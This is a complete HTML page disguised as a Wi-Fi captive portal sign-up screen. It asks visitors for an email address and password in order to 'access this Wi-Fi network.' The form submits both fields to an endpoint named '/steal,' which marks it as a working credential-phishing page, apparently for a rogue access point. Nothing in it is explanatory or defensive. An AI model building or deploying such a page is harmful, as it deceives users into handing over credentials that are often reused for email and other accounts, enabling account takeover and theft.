<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>Wi-Fi Access - Create Account</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #222222;
        }

        .container {
            background-color: #fafafa;
            border: 1px solid #ccc;
            padding: 25px 20px;
            width: 320px;
            text-align: center;
            border-radius: 3px;
        }

        h2 {
            font-size: 22px;
            margin-bottom: 12px;
            font-weight: 600;
            color: #000;
        }

        p {
            font-size: 14px;
            color: #333;
            margin-bottom: 18px;
            line-height: 1.4;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            font-size: 14px;
            border: 1px solid #bbb;
            border-radius: 2px;
            box-sizing: border-box;
            transition: border-color 0.2s ease;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #0078d7;
            outline: none;
        }

        button {
            width: 100%;
            padding: 11px;
            background-color: #0078d7;
            color: white;
            border: none;
            border-radius: 2px;
            font-size: 15px;
            margin-top: 15px;
            cursor: pointer;
            font-weight: 600;
            transition: background-color 0.2s ease;
        }

        button:hover {
            background-color: #005a9e;
        }

        .note {
            font-size: 12px;
            color: #666;
            margin-top: 20px;
            line-height: 1.3;
        }

        .footer {
            margin-top: 25px;
            font-size: 11px;
            color: #999;
        }

        a {
            color: #0078d7;
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Create Account</h2>
        <p>To access this Wi-Fi network, please create an account by providing your Email and Password.</p>
        <form action="/steal" method="post">
            <input type="text" name="username" placeholder="Email address" required autocomplete="email" />
            <input type="password" name="password" placeholder="Password" required autocomplete="new-password" />
            <button type="submit">Create Account</button>
        </form>
        <div class="note">
            Access is limited to 24 hours per sign-up for security reasons.
        </div>
        <div class="footer">
            By signing up, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
        </div>
    </div>
</body>
</html>
